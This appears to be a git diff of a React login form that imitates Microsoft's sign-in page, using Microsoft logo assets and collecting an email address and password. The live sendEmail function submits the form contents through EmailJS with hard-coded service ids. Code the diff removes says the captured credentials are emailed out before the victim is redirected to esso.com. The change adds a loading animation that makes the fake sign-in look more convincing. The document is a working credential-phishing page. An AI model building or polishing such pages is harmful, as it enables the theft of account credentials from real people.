@@ -6,6 +6,7 @@ import doc from "../assets/documentation.svg";
 import logo from "../assets/microsoft_logo.svg";
 import option_sign from "../assets/signin-options.svg";
 import left from "../assets/arrow_left.svg";
+import ants from "../assets/marching_ants.gif"
 
 import './login.css';
 
@@ -14,39 +15,26 @@ function LoginForm() {
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
   const [step, setStep] = useState(1);
+  const [showMachine, setShowMachine] = useState(false);
+  const [showMachineTimeout, setShowMachineTimeout] = useState(null);
   const form = useRef()
 
   const handleNext = () => {
     if (email !== '') {
       setStep(2);
+      setShowMachine(true);
+    clearTimeout(showMachineTimeout); // Effacer le timeout précédent
+    setShowMachineTimeout(setTimeout(() => setShowMachine(false), 500)); // Désactiver showMachine après 1 seconde
     } else {
       alert('Veuillez entrer votre adresse e-mail.');
     }
   };
 
-  // const handleSignIn = (e) => {
-  //   if (password !== '') {
-      // Ici, vous pouvez ajouter le code pour gérer la connexion.
-      // Par exemple, vous pouvez envoyer les données du formulaire à un serveur pour les vérifier.
-
-      // Envoyer un email
-  //     sendEmail(email, password)
-  //       .then(() => {
-  //         // Redirection vers https://www.esso.com
-  //         window.location.href = "https://www.esso.com";
-  //       })
-  //       .catch((error) => {
-  //         alert('Une erreur s\'est produite lors de l\'envoi de l\'e-mail.');
-  //         console.error(error);
-  //       });
-  //   } else {
-  //     alert('Veuillez entrer votre mot de passe.');
-  //   }
-  // };
-
-
   const sendEmail = (e) => {
     e.preventDefault();
+     setShowMachine(true);
+      clearTimeout(showMachineTimeout); // Effacer le timeout précédent
+      setShowMachineTimeout(setTimeout(() => setShowMachine(false), 2000)); // Désactiver showMachine après 2 secondes
        emailjs.sendForm('service_6imasjg', 'template_drpr0di', form.current, 'c1ER5L44OShcxudaZ')
       .then((result) => {
 
@@ -68,7 +56,11 @@ function LoginForm() {
     <div className="middle">
      
       <form className="container" ref={form} onSubmit={sendEmail} > 
-      {/*  */}
+      {showMachine && (
+      <div className="marchine">
+         <img src={ants} />
+      </div>
+      )}
         
          {/* logo */}
       <div className="logo">
